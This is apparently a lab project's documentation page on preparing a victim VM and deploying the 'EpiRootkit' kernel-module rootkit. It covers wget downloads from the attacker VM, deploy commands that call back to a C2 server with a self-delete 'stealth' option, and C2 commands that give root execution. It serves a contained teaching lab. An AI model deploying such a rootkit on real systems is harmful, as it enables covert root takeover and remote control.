---
title: "Victim VM Setup"
description: "Configure the victim VM and deploy the EpiRootkit"
icon: "shield"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 204
---

# Victim VM Setup

Deploy the EpiRootkit kernel module on the victim system.

## Prerequisites

1. **Host setup complete**: [Host Environment Setup]({{< relref "environment.md" >}})
2. **VM downloaded**: `vm/victim.qcow2` in project root
3. **VM launched**: `sudo ./scripts/run_vms.sh victim`

## VM Access

**Connection Details:**
- **IP Address**: 192.168.200.10 (static)
- **Username**: `victim` / **Password**: `jules`
- **Target**: Ubuntu 20.04 LTS with kernel 5.4.0

## Deployment Process

### 1. Receive Payload
Get the rootkit files from the attacker VM:

```bash
# Option A: HTTP download
wget http://192.168.200.11:8080/epirootkit.ko
wget http://192.168.200.11:8080/deploy_rootkit.sh

# Option B: SCP transfer
# Files transferred by attacker to victim@192.168.200.10:~/

# Option C: Web UI upload
# Use attacker's web interface file transfer panel
```

### 2. Deploy Rootkit
```bash
# Basic deployment (connects to 192.168.200.11:4444)
sudo ./deploy_rootkit.sh

# Custom C2 server
sudo ./deploy_rootkit.sh address=IP port=PORT

# Stealth deployment (self-destructs)
sudo ./deploy_rootkit.sh --self-delete
```

### 3. Verify Connection
Switch to attacker VM C2 server:
```bash
c2-server$ ls
# • Client-1 - UNAUTHENTICATED - Last seen: Just now

c2-server$ auth Client-1 password
c2-server$ exec Client-1 whoami
# Exit code: 0, Output: root
```

## Management

```bash
# Check status
sudo ./deploy_rootkit.sh status

# Remove rootkit
sudo ./deploy_rootkit.sh uninstall
```

For detailed deployment script options, see [EpiRootkit Deployment](../../05-epirootkit/deployment.md).
